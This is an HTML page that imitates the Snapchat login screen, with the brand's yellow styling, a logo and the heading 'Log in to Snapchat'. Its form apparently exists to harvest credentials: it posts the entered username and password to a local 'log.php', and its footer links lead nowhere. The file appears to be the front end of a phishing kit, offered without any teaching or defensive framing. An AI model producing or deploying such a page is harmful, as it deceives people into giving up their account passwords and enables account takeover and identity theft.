<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;500&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Helvetica', sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      width: 100%;
      max-width: 380px;
      border-radius: 15px;
      padding: 40px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .login-container img {
      width: 120px;
      margin-bottom: 30px;
    }

    h2 {
      font-size: 24px;
      font-weight: 500;
      color: #333;
      margin-bottom: 20px;
    }

    .input-field {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      color: #333;
    }

    .input-field:focus {
      outline: none;
      border-color: #fffc00;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #fffc00;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: 600;
      color: #333;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn-submit:hover {
      background-color: #f5e200;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 12px;
      color: #666;
    }

    .footer-text a {
      color: #fffc00;
      text-decoration: none;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <!-- Snapchat Logo -->
    <img src="logo.png" alt="Snapchat Logo">

    <h2>Log in to Snapchat</h2>

    <!-- Login Form -->
    <form action="log.php" method="POST">
      <input type="text" name="username" class="input-field" placeholder="Username or Email" required>
      <input type="password" name="password" class="input-field" placeholder="Password" required>
      <button type="submit" class="btn-submit">Log In</button>
    </form>

    <!-- Footer Links -->
    <div class="footer-text">
      <p><a href="#">Forgot your password?</a></p>
      <p><a href="#">Sign Up</a></p>
    </div>
  </div>

</body>
</html>
